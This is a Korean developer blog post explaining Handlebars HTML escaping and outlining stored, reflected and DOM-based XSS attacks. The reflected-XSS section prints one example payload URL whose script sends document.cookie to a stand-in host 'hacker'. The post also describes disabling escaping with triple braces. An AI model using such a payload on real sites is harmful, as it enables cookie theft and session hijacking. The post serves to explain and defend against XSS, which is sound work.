---
layout: post
title:  "HTML escaping과 XSS 공격"
excerpt: ""

categories:
  - Security
tags:
  - [Security, Web]

toc: true
toc_sticky: true
comments: true
 
date: 2021-09-05
last_modified_at: 2021-09-05

---

# HTML-escaping

개발 진행 중, handlebars(hbs 파일)로 웹을 그릴 때 특수문자가 출력되지 않는 QA가 발생하여 대응했다.

hbs에서 변수를 참조할 때 ``{{변수명}}`` 형태로 참조하고 있었는데, 이렇게 참조할 경우 자동으로 html-escaping이 적용된다.

이 때문에 특수문자가 escaping 문자로 출력되었고, {{{변수명}}} 으로 사용하여 html-escaping을 제거할 수 있었다.

(<https://handlebarsjs.com/guide/expressions.html#html-escaping>)

> HTML escaping이란?
>
> html 마크업 언어에서 사용하는 특수문자를 다른 약속된 문자로 치환하는 것이다.
>
> 아래는 특수문자와 변환되는 문자 목록이다.
>
> raw: & < > " ' ` = 
>
> html-escaped: &amp &lt &gt &quot &#x27 &#x60 &#x3D

HTML escaping 을 제거할땐 필연적으로 XSS 이슈에 대해 고민할 필요가 있다.

왜냐하면 HTML escaping이 나온 이유가 XSS 공격을 막기 위해서이기 때문이다.

# XSS 공격

## 개요

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=http%3A%2F%2Fcfile21.uf.tistory.com%2Fimage%2F99E25E485C89B3950DAB60)



XSS는 웹 어플리케이션에서 발생하는 취약점으로, 해커가 웹 사이트에 스크립트를 삽입하는 공격 기법이다.

악의적 사용자가 C&C 서버로 리다이렉션 하기 위해 리다이렉션 스크립트를 주입하기도 하고, 쿠키를 탈취하여 세션 하이재킹(Session Hijacking) 공격을 수행하기도 한다.

> C&C(Command & Control) 서버란, 
>
> 일반적으로 감염된 좀비 PC가 해커가 원하는 공격을 수행하도록 원격지에서 명령을 내리거나, 악성코드를 제어하는 서버를 말한다.
>
> 예를 들어, 감염된 PC로 악성코드를 유포시키거나, 스팸 전송, 또는 DDoS 공격 등을 전달하는 역할을 한다.

위의 사진은 XSS 공격 중 Persistent(or Stored) XSS Attack이고, 사용자의 세션을 탈취하는 프로세스를 나타내고 있다.

예를 들어, 해커는 쿠키값을 자신에게 전송하는 스크립트를 게시글에 삽입하고, 사용자가 그 게시글을 열람할 경우 스크립트가 실행되어 쿠키값을 탈취하게 된다. 이를 통해 해커는 사용자의 계정으로 로그인 할 수 있게 된다.

<br>

## 공격 종류 및 방법

### Persistent(or Stored) XSS

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=http%3A%2F%2Fcfile22.uf.tistory.com%2Fimage%2F997CF6485C89B39508BA31)

XSS 공격 종류 중 하나인 Persistent XSS는 말 그대로 지속적으로 피해를 입히는 XSS 공격이다.

해커가 XSS 취약점이 있는 부분을 파악한 후, 그 부분에서 출력이 되는 부분에 스크립트를 삽입한다.

이 때, 해커가 삽입한 부분이 Database에 저장되고, 웹사이트는 Database에서 그 값을 보여줄 때 악성스크립트가 실행되면서 해커가 의도한 데로 동작하게 된다.

이렇게 Database에 저장되어서 지속적으로 공격하는 것을 Persistent XSS 라고 부른다.

주로 많이 공격되는 곳이 게시판이며, 게시판 이외에도 사용자가 저장한 값을 프론트에서 보여주는 부분이라면 공격 대상이 될 수 있다.

<br>

### Reflected XSS

![](https://img1.daumcdn.net/thumb/R1280x0/?scode=mtistory2&fname=http%3A%2F%2Fcfile2.uf.tistory.com%2Fimage%2F99CB0F485C89B39406841B)

Reflected XSS 공격은 사용자에게 입력 받은 값을 서버에서 되돌려 주는 곳에서 발생한다.

예를 들어, 검색이라는 기능은 사용자가 검색한 값을 그대로 웹사이트에서 보여줄 것이다.

그리고 검색 같은 경우 대부분 GET 메소드로 호출할 것이기 때문에, URL에 검색할 값을 삽입할 수 있고, 해커는 검색할 값에 자신의 스크립트를 넣은 채로 url 링크를 만들어 사용자에게 보내는 것이다.

> 예를 들면, GET 방식으로 검색기능을 구현한 웹 애플리케이션에 XSS 취약점이 있음을 확인한 해커는 공격코드를 작성하였습니다. 편의상 URL 인코딩은 하지 않았습니다. 
>
> ```http://testweb?search=<script>location.href("http://hacker/cookie.php?value="+document.cookie);</script>```

아무 생각 없이 링크를 클릭했다가 낭패를 겪는 경우가 Reflected XSS 공격을 받은 경우일 수도 있다.

<br>

### DOM based XSS

DOM Based XSS는 DOM 객체 기반의 XSS 공격인데, 서버에서 잘못 의도된 HTML을 반환하여 문제가 발생하는 것과 다르게, DOM Based XSS는 브라우저가 해석하는 단계에서 (서버와 관계 없이) 발생하게 된다.

이 부분은 내가 설명하는 것보다 자세히 정리된 글이 있어서 링크를 남겨둔다.

<https://ddungkill.tistory.com/135>